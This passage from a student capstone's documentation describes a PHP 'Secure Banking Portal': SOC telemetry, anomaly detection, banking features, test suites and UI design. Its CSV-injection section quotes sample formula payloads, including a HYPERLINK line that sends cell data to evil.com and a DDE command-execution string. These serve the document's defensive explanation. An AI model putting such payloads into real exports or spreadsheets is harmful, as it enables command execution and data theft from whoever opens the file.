    - **File**: [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php)
    - **Mechanism**: `require_method('POST')` / `require_method(['GET', 'POST'])` terminates requests with HTTP 405 Method Not Allowed and sets the standard `Allow` response header. Neutralizes HTTP verb tampering and method switching exploits.

11. **[A11] Input Canonicalization Engine**:
    - **File**: [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php)
    - **Mechanism**: `canonicalize_input()` strips dangerous null-bytes (`\0`), performs recursive single-pass HTML entity decoding, and applies Unicode Normalization Form KC (`Normalizer::normalize(..., Normalizer::FORM_KC)`). Ensures WAF regex filters cannot be bypassed via alternate character encodings or null-byte truncations.

12. **[A12] Cryptographic Tamper-Proof Audit Log Hash Chain**:
    - **Files**: [`security/logger.php`](file:///Secure-Banking-Portal/security/logger.php), [`admin/verify_log_chain.php`](file:///Secure-Banking-Portal/admin/verify_log_chain.php), table `security_logs`
    - **Mechanism**: Implements blockchain-style SHA-256 forward chaining:
      $$\text{curr\_hash} = \text{SHA-256}(\text{prev\_hash} \parallel \text{timestamp} \parallel \text{user\_id} \parallel \text{event} \parallel \text{severity} \parallel \text{ip} \parallel \text{status} \parallel \text{payload})$$
      The `verify_log_chain()` engine traverses the entire table and mathematically verifies every block against the preceding digest. Any unauthorized direct database modification, deletion, or rogue row insertion breaks the chain and isolates the exact tampered row ID.

13. **[A13] Two-Factor Emergency Recovery Codes**:
    - **Files**: [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php), [`api/verify_otp.php`](file:///Secure-Banking-Portal/api/verify_otp.php), table `recovery_codes`
    - **Mechanism**: Generates 10 cryptographically random backup codes (`XXXX-XXXX` format). Codes are Bcrypt-hashed before storage. When used in place of an OTP during login, the system verifies via `password_verify()`, marks the code `used = 1`, and logs the timestamp, defeating replay attacks.

---

## 11. Distinction-Grade Upgrades: Pillar C — Observability & SOC

Pillar C upgrades the Secure Banking Portal from a passive web application into a fully observable, SOC-grade enterprise platform. It introduces real-time streaming telemetry, statistical anomaly detection, automated incident alerting, Prometheus metrics export, formula-safe log exports, and end-user security posture gamification.

```
+─────────────────────────────────────────────────────────────────────────────────────────────────────────+
|                                    PILLAR C: OBSERVABILITY & SOC PIPELINE                               |
+─────────────────────────────────────────────────────────────────────────────────────────────────────────+
  ┌──────────────────────┐      ┌─────────────────────────┐      ┌──────────────────────────────────────┐
  │  Security Telemetry  │ ───► │  4-Tier Severity Engine │ ───► │ Heuristic Anomaly Detector (6 Rules) │
  │  (login, csrf, sqli) │      │  (low/med/high/critical)│      │  (velocity, burst, off-hours, spikes)│
  └──────────────────────┘      └─────────────────────────┘      └──────────────────┬───────────────────┘
                                                                                    │
                                ┌───────────────────────────────────────────────────┴───────────────────┐
                                │                                                                       │
                                ▼                                                                       ▼
                  ┌───────────────────────────┐                                           ┌───────────────────────────┐
                  │ Automated Alerting Engine │                                           │ Cryptographic Hash Chain  │
                  │ - Sliding-Window SLAs     │                                           │ - SHA-256 Ledger (A12)    │
                  │ - Alert Deduplication     │                                           │ - Tamper Proof Verification│
                  └─────────────┬─────────────┘                                           └─────────────┬─────────────┘
                                │                                                                       │
                                ▼                                                                       ▼
  ┌───────────────────────────────────────────────────────────┐           ┌───────────────────────────────────────────┐
  │                Administrator SOC Dashboard                │           │     Prometheus Exporter & SIEM Export     │
  │  - Real-Time SSE Stream (15s heartbeat, non-blocking)     │           │  - /admin/metrics.php (Bearer token / RBAC│
  │  - Dynamic Posture Histogram (At-Risk / Strong / etc.)    │           │  - CSV / JSON Export (/admin/export_logs) │
  │  - Live Incident Triage & Acknowledgment Queue            │           │  - CWE-1236 Formula Injection Defense     │
  └───────────────────────────────────────────────────────────┘           └───────────────────────────────────────────┘
```

---

### [C1] Real-Time Security Feed via Server-Sent Events (SSE)
- **Endpoint**: `/admin/stream_events.php` & Client Consumer: `/js/soc_feed.js`
- **Why SSE over WebSockets**: WebSockets require full-duplex communication and dedicated stateful daemons (Node.js/Ratchet) that complicate traditional PHP deployments. SSE operates over standard unidirectional HTTP/1.1 or HTTP/2, traverses corporate firewalls effortlessly, natively supports client-side auto-reconnection via the browser's `EventSource` API, and adheres to W3C standards without third-party dependencies.
- **PHP Session Lock Prevention**: PHP file-based sessions acquire an exclusive write lock on `sess_<id>`, blocking all concurrent HTTP requests from the same user until the script terminates. In a long-running streaming connection, this would freeze the entire browser interface. `stream_events.php` invokes `session_write_close()` immediately after authenticating administrator claims, allowing unrestricted parallel navigation.
- **Heartbeat & Failover**: Dispatches keep-alive comment frames (`: heartbeat <timestamp>\n\n`) every 15 seconds to prevent intermediate proxy timeout disconnects (Cloudflare/Nginx 60s idle drop). If SSE is unsupported or fails, `soc_feed.js` automatically degrades gracefully to 10-second AJAX polling.
- **Examiner Talking Point**: *"We chose Server-Sent Events (SSE) because SOC telemetry is strictly server-to-client unidirectional. Crucially, we call `session_write_close()` immediately upon session validation to release PHP's session file lock, preventing concurrent administrator dashboard requests from freezing."*

---

### [C2] 4-Tier Threat Severity Levels
- **Levels**: `low`, `medium`, `high`, `critical`
- **Mapping Engine**: `config/severity_map.php` (`get_event_severity()`)
- **Database Schema**: Enforced via MySQL `ENUM('low', 'medium', 'high', 'critical') DEFAULT 'low'` with compound indexes (`idx_severity`, `idx_event_timestamp`, `idx_ip_event`).
- **Classification Rubric**:
  - `critical`: Exploits with immediate integrity compromise (`SQLI_BLOCKED`, `HASH_CHAIN_TAMPERED`, `SYSTEM_TAMPER`).
  - `high`: Direct policy violations and active attacks (`CSRF_FAILURE`, `XSS_BLOCKED`, `DIRECTORY_TRAVERSAL`, `ACCOUNT_LOCKED`, `ANOMALY_DETECTED`).
  - `medium`: Behavioral deviations and threshold warnings (`LOGIN_FAILED`, `RATE_LIMIT_EXCEEDED`, `OTP_FAILED`, `OFF_HOURS_ADMIN_ACTION`).
  - `low`: Normal auditable operational events (`LOGIN_SUCCESS`, `LOGOUT`, `TRANSFER_SUCCESS`, `PASSWORD_CHANGED`, `AUDIT_LOG_EXPORTED`).
- **Examiner Talking Point**: *"Threat triage cannot treat a typo in a password the same as an SQL injection attack. Our 4-tier model categorizes events at ingestion time, driving automated SIEM escalation rules and color-coded SOC visual feeds."*

---

### [C3] Heuristic Anomaly Detection Engine
- **Implementation**: `security/anomaly_detector.php` (`detect_anomalies()`)
- **Why Behavioral Heuristics**: Signature-based detection fails against zero-days, credential stuffing, and internal account takeover (ATO). Heuristic analysis establishes dynamic baseline profiles and detects anomalous deviation across 6 behavioral and temporal rules:
  1. **Rule 1 — Brute-Force Velocity**: Flags $\ge 10$ failed login attempts from the same IP within a 5-minute sliding window (credential stuffing attack).
  2. **Rule 2 — Unusual Transfer Amount**: Flags any transaction whose amount exceeds $3\times$ the account's 30-day historical transaction average (account drain / unauthorized transfer).
  3. **Rule 3 — Off-Hours Administrative Action**: Evaluates administrative configuration updates occurring during off-hours ($00:00 - 06:00$ local time), flagging potential insider threats or compromised admin credentials.
  4. **Rule 4 — Rapid Beneficiary Burst**: Flags the creation of $\ge 5$ new payees within 10 minutes (classic preparatory sign of automated banking malware).
  5. **Rule 5 — Diurnal Login Hour Anomaly**: Compares login time against the user's historical 30-day diurnal login distribution.
  6. **Rule 6 — IP Subnet Shift**: Compares the incoming client `/24` subnet against established CIDR origins.
- **Examiner Talking Point**: *"Attackers easily bypass static signatures by slightly altering attack strings. Our heuristic anomaly engine establishes behavioral baselines per user and system, flagging velocity spikes, midnight administrative activity, and sudden transfer surges."*

---

### [C4] Dynamic User Security Posture Scoring (0–100)
- **Engine**: `security/security_score.php` (`compute_security_score()`)
- **API**: `/api/security_score.php` | **UI**: Circular SVG Gauge in `/frontend/profile.html`
- **Why Gamify Security**: Consumer banking security fails when end-users disable MFA or reuse weak passwords. Modern fintechs (Monzo, Revolut) gamify cyber hygiene by giving users real-time transparent posture scores and itemized remediation recommendations.
- **Scoring Rubric (100-Point Model)**:
  - `+30 pts`: Multi-Factor Authentication (MFA) enabled.
  - `+15 pts`: Emergency 2FA offline recovery backup codes generated.
  - `+20 pts`: Account password rotated within the past 90 days.
  - `+10 pts`: Password complies with high-entropy complexity requirements.
  - `+10 pts`: Clean security ledger (zero failed login attempts in past 7 days).
  - `+10 pts`: Multi-channel recovery verified (both valid email and phone registered).
  - `+5 pts`: Known trusted network origin consistency.
- **SOC Histogram Integration**: `/admin/security-dashboard.php` renders aggregate user security score distributions divided into 4 risk tiers: *At Risk* ($<40$), *Moderate* ($40-69$), *Strong* ($70-89$), and *Exceptional* ($\ge 90$).
- **Examiner Talking Point**: *"Security posture scoring bridges the gap between technical controls and user behavior. By computing dynamic 0–100 scores and displaying an interactive SVG gauge with actionable remediation tips, we incentivize users to enable MFA and rotate credentials."*

---

### [C5] Prometheus-Compatible Metrics Scrape Exporter
- **Endpoint**: `/admin/metrics.php`
- **Exposition Format**: Plaintext Prometheus / OpenMetrics v0.0.4.
- **Authentication**: Dual-mode protection:
  - Active administrative browser session (`role = 'admin'`).
  - HTTP Authorization Header: `Authorization: Bearer <METRICS_TOKEN>`.
- **DoS Mitigation**: 5-second atomic file-backed caching (`logs/metrics_cache.txt`) to protect the MySQL database from scrape storms and scraper exhaustion.
- **Exposed Metrics**:
  - `banking_login_attempts_total{status="success|failure"}` (Counter)
  - `banking_security_events_total{event_type="...",severity="..."}` (Counter)
  - `banking_users_total{role="..."}` (Gauge)
  - `banking_active_sessions` (Gauge)
  - `banking_audit_chain_valid` (Gauge: 1=intact, 0=tampered)
  - `banking_unacknowledged_alerts` (Gauge)
  - `banking_http_requests_total{endpoint="..."}` (Counter)
- **Sample `prometheus.yml` Configuration**:
  ```yaml
  scrape_configs:
    - job_name: 'secure_banking_portal'
      scrape_interval: 15s
      metrics_path: '/admin/metrics.php'
      bearer_token: 'sec_metrics_token_9876543210'
      static_configs:
        - targets: ['localhost:80']
  ```
- **Examiner Talking Point**: *"Prometheus is the cloud-native standard for observability. Any enterprise Grafana dashboard or Alertmanager cluster can scrape `/admin/metrics.php` directly using standardized Bearer tokens without requiring custom agents or third-party PHP extensions."*

---

### [C6] SIEM Audit Log Export & Formula Injection Defense (CWE-1236)
- **Endpoint**: `/admin/export_logs.php` (`?format=csv` or `?format=json`)
- **Sanitizer Engine**: `security/csv_safe.php` (`csv_escape()`)
- **CWE-1236 Threat Vector (Spreadsheet Formula Injection)**: When audit logs are exported to CSV and opened in Microsoft Excel, LibreOffice Calc, or Google Sheets, cells starting with `=`, `+`, `-`, `@`, `\t`, `\r`, or `%` are parsed as executable expressions. An attacker can submit transfer remarks or usernames containing malicious DDE payloads (e.g. `=cmd|'/C calc'!A0` or `=HYPERLINK("http://evil.com?leak="&A2)`). When an unsuspecting SOC analyst opens the exported CSV, Excel executes arbitrary commands or exfiltrates confidential bank data out-of-band.
- **Mitigation**: `csv_escape()` inspects every cell prior to CSV serialization. If the string starts with any formula trigger character (`=`, `+`, `-`, `@`, `\t`, `\r`, `%`), it prepends an apostrophe (`'`). Modern spreadsheet engines interpret the apostrophe as a directive to treat the entire cell content as literal text.
- **Examiner Talking Point**: *"We defend against CSV Formula Injection (CWE-1236)—an obscure vulnerability where malicious log payloads execute DDE commands or exfiltrate ledger data via `=HYPERLINK()` when opened in Excel. We prepend an apostrophe to all formula trigger characters, neutralizing client-side spreadsheet execution."*

---

### [C7] Automated SIEM Alerting Engine
- **Implementation**: `security/alert_engine.php` (`evaluate_alerts()`)
- **Triage API**: `/admin/acknowledge_alert.php` | **Rule Management**: `/admin/alerts.php`
- **Why Automated Alerting**: Telemetry is ineffective if operators only inspect logs post-breach. Our SIEM alerting engine evaluates incoming telemetry events in real time against configurable rules in `alert_rules`.
- **Sliding-Window SLA Thresholding**: Automatically evaluates event counts over rolling time windows (e.g. 5 `CSRF_FAILURE` events within 600 seconds generates a `high` severity incident).
- **Alert Fatigue Deduplication**: Subsequent events occurring within the suppression interval do not generate duplicate alert entries, preventing alert fatigue and ticket storming.
- **Incident Acknowledgment & Audit Trail**: SOC operators triage unacknowledged alerts directly from `/admin/security-dashboard.php`, stamping the alert with `acknowledged = 1`, `acknowledged_by`, and an ISO-8601 timestamp.
- **Critical Incident Escalation**: Critical threats (`SQLI_BLOCKED`, `HASH_CHAIN_TAMPERED`) trigger `notify_admins()`, dispatching simulated on-call notifications (in `DEMO_MODE=true`) or enterprise webhooks.
- **Examiner Talking Point**: *"Our mini-SIEM features sliding-window threshold evaluation, alert suppression windows to prevent alert fatigue, and operator triage acknowledgment—mirroring the operational architecture of PagerDuty and Datadog."*

---

## 12. Distinction-Grade Upgrades: Pillar B — Real-World Commercial Banking Features

Pillar B upgrades the platform from a defensive demonstration into an authentic, feature-rich commercial banking simulation while strictly preserving all defensive controls from Pillar A and observability systems from Pillar C.

All monetary operations route exclusively through the centralized transfer service ([`security/transfer_service.php`](file:///Secure-Banking-Portal/security/transfer_service.php)) with pessimistic row locking (`SELECT ... FOR UPDATE`), pre-lock velocity checks, and dual-balance ledger synchronization.

| Feature Ref | Component & Purpose | Implementation Files | Key Technical / Security Mechanism | Examiner Talking Point |
| :--- | :--- | :--- | :--- | :--- |
| **[B1]** | **Transaction Categories & Analytics** | `api/categories.php`<br>`api/analytics.php`<br>`frontend/dashboard.html`<br>`js/dashboard.js` | 9 predefined categories with colors & icons; Chart.js Doughnut (spending distribution) & Bar chart (income vs. expense); local bundle with SHA-384 SRI. | *"Analytics are rendered with DOM-safe textContent and local SRI-verified Chart.js, visualizing multi-category transaction volumes without exposing user metrics to external third parties."* |
| **[B2]** | **Scheduled / Recurring Transfers** | `security/scheduler.php`<br>`api/schedule_transfer.php`<br>`frontend/schedule.html` | Zero-cron lazy scheduler triggered on authenticated traffic with a 60s throttle; atomic execution; failure-pause safety (overdrafts pause schedule immediately). | *"The zero-cron lazy scheduler guarantees recurrence execution on traffic touchpoints with a 60-second atomic throttle and automatic failure-pause protection against overdraft cascading."* |
| **[B3]** | **Statement Export Engine (CSV/PDF)** | `api/export_statement.php`<br>`vendor/tcpdf/tcpdf.php`<br>`frontend/transactions.html` | Format whitelisting (`csv\|pdf`); 12-month query limit; IDOR ownership check; CWE-1236 CSV injection defense (apostrophe prefixing on `=,+,-,@,\t,\r`); native zero-dependency vector PDF 1.4 generation. | *"Statement exports defend against CWE-1236 Formula Injection by neutralizing spreadsheet command prefixes and generate compliant vector PDF 1.4 streams without heavy external runtime dependencies."* |
| **[B4]** | **Beneficiary 2-Step Verification** | `api/beneficiaries.php`<br>`api/verify_beneficiary.php`<br>`frontend/verify_beneficiary.html` | New payees created with `verified = 0` and a 6-digit OTP stored as a Bcrypt hash with a 10-minute expiry; 5-attempt anti-brute force lockout; transfers blocked until verified; hash purged upon activation. | *"Beneficiary enrollment enforces out-of-band 2-step verification using Bcrypt-hashed OTPs and strict 5-attempt brute-force rate limiting before funds can be transferred."* |
| **[B5]** | **Multi-Tier Velocity Limits** | `security/transfer_service.php`<br>`tests/test_velocity_limits.php` | Pre-lock single transaction limit check, rolling 24-hour daily limit check, and rolling 30-day monthly volume limit check; automated SIEM event logging (`TRANSFER_LIMIT_*`) with `medium` severity. | *"All money transfers route through a centralized transfer service that evaluates 3 tiers of velocity limits (single, daily, monthly) before obtaining pessimistic row locks, preventing race condition bypasses."* |
| **[B6]** | **Multi-Account Support & Isolation** | `api/accounts.php`<br>`api/open_account.php`<br>`frontend/accounts.html` | Support for Savings (3.5% APY), Current (0.0%), and Fixed Deposit (6.5%); unique account number generation; max 5 accounts per customer; IDOR source check; seamless atomic internal transfers. | *"Multi-account banking enforces a strict 5-account limit per customer, protects debit endpoints against IDOR source manipulation, and enables atomic internal transfers between accounts."* |
| **[B7]** | **In-Portal Notification Center** | `security/notifications.php`<br>`api/notifications.php`<br>`api/mark_read.php`<br>`frontend/notifications.html` | Persistent notification engine; real-time unread badge on navigation bars across all pages; tenant isolation on read transitions; bulk mark-all-read scoped strictly to authenticated user. | *"The notification center informs users in real time of security events and fund transfers, with full tenant isolation preventing IDOR manipulation of notification states."* |
| **[B8]** | **Device Fingerprinting & Alerts** | `security/devices.php`<br>`api/verify_otp.php`<br>`frontend/devices.html` | Privacy-preserving deterministic device fingerprinting via `hash('sha256', UA \| IP/24 \| Lang)`; automated high-priority alert and notification on unrecognized device login; session revocation capability. | *"Device authentication hashes client headers and IP subnets to alert users to unauthorized sessions without storing raw tracking cookies or invading user privacy."* |
| **[B9]** | **Admin User Management & Freezing** | `admin/users.php`<br>`admin/api/freeze_user.php`<br>`admin/api/update_limits.php` | Admin directory with search, pagination, and status filters; one-click account freezing (blocks outgoing transfers immediately via transfer engine check); self-freeze prevention; admin limit adjustment. | *"Admin controls allow immediate freezing of compromised accounts and dynamic velocity tuning, with hardcoded guards preventing administrative self-lockout or privilege escalation."* |
| **[B10]**| **Admin Transaction Monitor** | `security/transaction_monitor.php`<br>`admin/transactions.php`<br>`admin/api/review_transaction.php` | Automated heuristic anomaly evaluation post-commit: high value ($\ge \$50,000$), round-number structuring ($\ge \$10,000$ exact multiple of $\$1,000$), rapid burst velocity ($\ge 3$ txns in 5m); triage queue with audit resolution. | *"The transaction monitor flags anomalous financial behaviors in real time, routing high-risk transfers into an administrative compliance triage queue with an immutable audit trail."* |

---

## 13. Distinction-Grade Upgrades: Pillar D — Academic Rigor & Report-Ready Documentation

Pillar D provides the forensic evidence, threat modeling, academic traceability, and viva examination preparation required for top-tier academic capstone distinction. All artifacts reside in [`docs/`](file:///Secure-Banking-Portal/docs/) and [`docs/BURP_EVIDENCE/`](file:///Secure-Banking-Portal/docs/BURP_EVIDENCE/):

1. **[Threat Model & Architecture Specification](file:///Secure-Banking-Portal/docs/THREAT_MODEL.md)** (`docs/THREAT_MODEL.md`):
   - Detailed STRIDE analysis (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).
   - Asset classification with CIA impact ratings.
   - Four trust boundary definitions and Mermaid Level 1 Data Flow Diagram (DFD).
   - Mitigation Traceability Matrix mapping every identified threat to defensive code and automated tests.

2. **[Security Test Matrix](file:///Secure-Banking-Portal/docs/TEST_MATRIX.md)** (`docs/TEST_MATRIX.md`):
   - 26 standardized security test scenarios covering XSS (Reflected, Stored, DOM), CSRF, SQLi, Command Injection, Directory Traversal, SSRF, Clickjacking, CORS, Session Fixation, Insecure Deserialization, Broken Access Control (Horizontal & Vertical IDOR), Rate Limit bypass, CSV Formula Injection (CWE-1236), and Malicious File Uploads.
   - Standardized columns: `Test ID | Vulnerability | OWASP 2021 | Payload | Target Endpoint | Expected | Actual | Mitigation | Status`.
   - **100% Pass Rate (26 / 26 Mitigated)**.

3. **[Burp Suite Penetration Testing Evidence Pack](file:///Secure-Banking-Portal/docs/BURP_EVIDENCE/)** (`docs/BURP_EVIDENCE/`):
   - Complete directory of raw HTTP requests and responses demonstrating defensive containment across 10 attack classes:
     - `01_sqli_blocked.txt`: SQL injection authentication bypass neutralized by native prepared statements.
     - `02_xss_blocked.txt`: Stored/DOM XSS neutralized by safe `textContent` DOM sinks and nonce-based CSP 2.0.
     - `03_csrf_blocked.txt`: State-changing requests lacking `X-CSRF-Token` rejected with HTTP 403 Forbidden.
     - `04_path_traversal_blocked.txt`: Dot-dot-slash traversal sequences blocked by `realpath()` canonical sandbox.
     - `05_rate_limit_lockout_429.txt`: Credential stuffing intercepted with HTTP 429 and progressive lockout tiers.
     - `06_idor_account_blocked.txt`: Horizontal account debit attempt blocked by tenant ownership verification.
     - `07_malicious_upload_blocked.txt`: Polyglot PHP web shell disguised as JPEG blocked by MIME/geometry pipeline.
     - `08_csv_injection_defused.txt`: DDE formula execution (`=cmd|'/C calc'!A0`) defused with leading single quote.
     - `09_ssrf_blocked.txt`: Loopback (127.0.0.1) and AWS metadata (169.254.169.254) probes blocked by CIDR firewall.
     - `10_burp_intruder_bruteforce_log.txt`: Intruder fuzzing log showing fast-path latency drop (68ms $\to$ 10ms) and progressive freeze.
     - `BURP_SUITE_GUIDE.md`: Step-by-step reproduction guide and before/after mitigation comparative analysis.

4. **[OWASP Top 10:2021 Defense Mapping](file:///Secure-Banking-Portal/docs/OWASP_MAPPING.md)** (`docs/OWASP_MAPPING.md`):
   - Exhaustive theoretical analysis, banking attack scenarios, portal architecture controls, exact code locations, and examiner talking points for all 10 categories (A01 through A10).

5. **[Capstone Presentation & Video Demonstration Script](file:///Secure-Banking-Portal/docs/DEMO_SCRIPT.md)** (`docs/DEMO_SCRIPT.md`):
   - Synchronized 8-minute demonstration script with exact timestamps, visual cues, spoken narrative, and vulnerability proofs, culminating in a live Burp Suite attack demonstration.

6. **[Academic Viva Voce Q&A Master Bank](file:///Secure-Banking-Portal/docs/VIVA_QA.md)** (`docs/VIVA_QA.md`):
   - 40 detailed, academic questions and answers spanning 6 core domains: Cryptography & Hashing, Database Security & Concurrency, Session Management, Web Vulnerabilities, API Security, and Observability & Threat Modeling.

7. **[Comparative Analysis & OWASP ASVS Level 2 Compliance](file:///Secure-Banking-Portal/docs/COMPARISON.md)** (`docs/COMPARISON.md`):
   - 12-dimensional comparative study benchmarking an Insecure Baseline Student Demo against our Secure Banking Portal and the **OWASP ASVS v4.0.3 Level 2** standard, demonstrating complete compliance across all 18 core verification requirements.

8. **[Security vs. Performance Tradeoff & Empirical Benchmarks](file:///Secure-Banking-Portal/docs/PERFORMANCE.md)** (`docs/PERFORMANCE.md`):
   - Empirical microsecond and millisecond benchmark measurements captured on host PHP environment:
     - CSPRNG Nonce Generation: **0.148 µs**
     - Input Canonicalization: **1.015 µs**
     - Combined per-request middleware overhead: **~1.42 µs (< 0.002 ms)**
     - Bcrypt scaling curve: Cost 10 (61.61 ms), Cost 11 (117.29 ms), Cost 12 (243.97 ms - OWASP target), Cost 13 (488.20 ms).
     - Pessimistic row-locking database transaction duration: **8.786 ms**.

---

## 14. Distinction-Grade Upgrades: Pillar E — Fintech-Grade UI & Modern UX Architecture

Pillar E elevates the entire user experience of the Secure Banking Portal from a basic functional application to a production-grade commercial fintech banking portal (benchmarked against **HDFC, ICICI, Monzo, Revolut, and Stripe**), while strictly preserving 100% of defensive security controls established in Pillars A, B, and C.

### 14.1 Core Design System Architecture (`css/tokens.css` & `css/style.css`)
- **Brand Palette & Tokens**:
  - Primary Brand: Deep Navy (`#0B1F3A`) & Dark Navy (`#071324`)
  - Secondary Brand: Royal Blue (`#1E5EFF`) with vibrant interactive hover state (`#1548CC`)
  - Semantic Status: Emerald Success (`#00B87C`), Amber Warning (`#F5A623`), Crimson Danger (`#E5484D`), Sky Info (`#0284C7`)
  - Neutral Scale: High-contrast slate neutrals (`#0F172A` down to `#F8FAFC`) meeting WCAG AA standards (> 4.5:1 contrast).
- **Self-Hosted Typography (Zero External CDN Dependencies)**:
  - Sans-Serif: **Inter** (Regular 400, Medium 500, SemiBold 600) self-hosted in `fonts/inter/*.woff2`.
  - Monospace: **JetBrains Mono** self-hosted in `fonts/jetbrains-mono/*.woff2` with `font-variant-numeric: tabular-nums` for precise alignment of financial balances, account numbers, and cryptographic hashes without layout jitter.
- **Dynamic Dark / Light Mode Engine (`js/theme.js`)**:
  - Independent client-side theme switcher persisting preference in `localStorage`.
  - Automatic detection of OS `prefers-color-scheme` media query.
  - Dedicated Dark Mode tokens (`[data-theme="dark"]`) adjusting surfaces (`#0E1726`), subtle backgrounds (`#162032`), and borders (`#1F2D44`).

### 14.2 Production Component Library (`css/components.css`)
- **Buttons (`.btn`)**: Accessible sizes (`.btn-sm`, `.btn-lg`), variants (`.btn-primary`, `.btn-secondary`, `.btn-danger`, `.btn-ghost`), loading states (`.spinner`), and `:focus-visible` keyboard rings.
- **Form Inputs (`.field`)**: Structured input wrappers, floating labels, SVG password visibility eye toggles, error borders (`.has-error`), and helper hints.
- **Modals (`.modal-overlay`, `.modal`)**: Accessible modal dialogs with focus trapping, `ESC` key dismiss, and backdrop dismissal (`js/components/modal.js`).
- **Toasts (`.toast-container`, `.toast`)**: Non-blocking toast notifications in `aria-live="polite"` regions with automatic fadeout (`js/components/toast.js`).
- **Badges & Pills (`.badge`)**: High-contrast indicator pills with optional live pulsing dots for active real-time status.

### 14.3 Page-Level Modernization & Zero-Inline Script Policy
Every page in the portal was completely redesigned with semantic HTML5 and decoupled JavaScript:
1. **Landing Page (`frontend/index.html`)**: Deep navy hero banner, 4 architectural pillar feature cards, evaluation credentials sandbox, and dark theme support.
2. **Authentication (`frontend/login.html` & `js/login.js`)**: 60/40 fintech split-screen, visual trust badges, animated SVG password toggle, rate-limit feedback handling HTTP 429 countdowns.
3. **Multi-Factor Auth (`frontend/mfa.html` & `js/mfa.js`)**: 460px centered security card with 6 auto-advancing OTP digit boxes, paste detection, and emergency recovery code toggle.
4. **Dashboard (`frontend/dashboard.html` & `js/dashboard.js`)**: Sticky 64px header, user initials dropdown, full-width gradient balance hero card with multi-account switching pills, Chart.js cash-flow and spending donuts, and accessible open account modal.
5. **Transfers (`frontend/transfer.html` & `js/transfer.js`)**: 60/40 two-column stepper layout (5 progressive steps), category chips, dynamic amount in submit button (`Transfer $X,XXX.XX`), and live velocity limit warnings.
6. **Transactions (`frontend/transactions.html` & `js/transactions.js`)**: Real-time search filter, category filter dropdown, sticky thead table, and accessible CSV/PDF statement export modal with CWE-1236 formula escaping.
7. **Beneficiaries (`frontend/beneficiaries.html` & `js/beneficiaries.js`)**: Payee cards grid with masked account numbers, verified status badges, and modal payee enrollment.
8. **Security Profile (`frontend/profile.html` & `js/profile.js`)**: Animated 140px SVG circular security posture gauge (0–100), hygiene rubric checklist, dynamic recommendations, and 6-tier secure avatar upload.
9. **SOC SIEM Command Center (`admin/security-dashboard.php` & `js/admin_soc.js`)**: Dedicated dark console (`#0B1220`), live pulsing green dot, KPI metric cards, stacked threat severity distribution bar, and real-time SSE stream (`js/soc_feed.js`).
10. **Admin Directories (`admin/users.php`, `admin/transactions.php`, `admin/alerts.php`, `admin/verify_log_chain.php`)**: Dark SOC theme, tabular data, badge indicators, delegated event handling (`data-action`), and CSP nonce compliance.

### 14.4 Strict Security & Nonce Compliance Guarantees
- **100% Nonce Enforcement**: Zero `<script>` or `<style>` blocks execute without valid CSP nonce.
- **Zero Inline Scripts**: All client logic extracted to external `.js` files; zero inline `onclick` or event handler attributes across the codebase.
- **Strict DOM XSS Defense**: All dynamic user-controlled strings rendered strictly via `textContent` and `createElement`, never `innerHTML`.

For detailed before/after interface breakdowns, refer to [`docs/UI_BEFORE_AFTER/UI_TRANSFORMATION_GUIDE.md`](file:///Secure-Banking-Portal/docs/UI_BEFORE_AFTER/UI_TRANSFORMATION_GUIDE.md).

---

## 15. Distinction-Grade Upgrades: Pillar F — Code Quality, Static Analysis & Defensive Standards

Pillar F enforces enterprise software engineering standards, static analysis linting, and defensive architecture rules across the entire codebase to guarantee production readiness.

### 15.1 Static Analysis & Linting Pipeline (`tests/test_code_quality.php`)
- **PHP 8.2+ Syntax Verification**: Automated `php -l` lint execution across all 58 PHP scripts in `api/`, `security/`, `config/`, and `admin/`, confirming zero syntax errors, parse failures, or deprecation notices.
- **Production Hygiene**: Zero leftover debug statements (`var_dump()`, `print_r()`, raw unhandled `die()`) in any application controllers or middleware.
- **Supply-Chain Sovereignty**: All required typography (Inter 400/500/600, JetBrains Mono 400/600) and vector brand assets are self-hosted locally in `fonts/` and `images/` with non-zero byte size verification.

### 15.2 Database Hardening & Driver Constraints
- **Native Prepared Statements (`PDO::ATTR_EMULATE_PREPARES => false`)**: Disables client-side emulation, ensuring MySQL compiles SQL statements and parses user parameters as distinct wire packets.
- **Strict Exception Mode (`PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION`)**: Traps all database execution errors in structured `try/catch (Throwable $e)` blocks without failing open.
- **Information Disclosure Defense (CWE-209)**: Exceptions log detailed debugging information to `error_log()` while responding to clients with clean, sanitized JSON error payloads.

### 15.3 PHP 8 Type Safety & Strict Signatures
Core security functions declare explicit parameter and return types:
- `validate_csrf_token(?string $candidate_token = null): bool`
- `generate_csrf_token(): string`
- `canonicalize_input(mixed $input): mixed`
- `validate_password_strength(string $password): array`
- `verify_log_chain(): array`
- `transfer_funds(array $params, string $context = 'user'): array`

For complete code quality specifications, refer to [`docs/CODE_QUALITY.md`](file:///Secure-Banking-Portal/docs/CODE_QUALITY.md).

---

## 16. Master Comprehensive Test Suite (26 Suites, 147 Tests, 100% Pass)

A unified automated test suite provides complete, end-to-end regression and verification coverage across all Pillar A security mechanisms, Pillar C observability engines, Pillar B banking features, and Pillar F code quality standards.

### Running the Test Suite:
To execute the master test runner from the command line:
```bash
php tests/run_all.php
```

To run individual test suites modularly:
```bash
# Pillar A — Security Depth
php tests/test_csrf.php            # CSRF synchronizer token verification
php tests/test_validation.php      # Canonicalization, HPP defense, allowlists
php tests/test_auth.php            # Dual-tier sessions, fixation, recovery codes
php tests/test_rate_limit.php      # Sliding-window rate limit, 3 lockout tiers
php tests/test_password_reset.php  # SHA-256 reset tokens, single-use, expiry
php tests/test_hash_chain.php      # Cryptographic audit hash chain & tamper detection
php tests/test_avatar_upload.php   # 6-tier avatar file upload defense pipeline

# Pillar C — Observability & SOC
php tests/test_sse.php             # Server-Sent Events (SSE) streaming & session unlock
php tests/test_severity.php        # 4-tier threat severity schema & mapping
php tests/test_anomaly.php         # Heuristic anomaly detector (6 behavioral rules)
php tests/test_security_score.php  # Dynamic posture score (0-100) & histogram
php tests/test_metrics.php         # Prometheus scrape exporter & token authentication
php tests/test_export_csv_safe.php # CSV formula injection defense (CWE-1236)
php tests/test_alert_engine.php    # Automated SIEM alerting & deduplication
php tests/test_chain_still_valid.php # Audit log hash chain health post-Pillars C & B

# Pillar B — Real-World Banking Features
php tests/test_categories.php      # Transaction categories & Chart.js analytics
php tests/test_scheduled.php       # Scheduled transfers & failure-pause policy
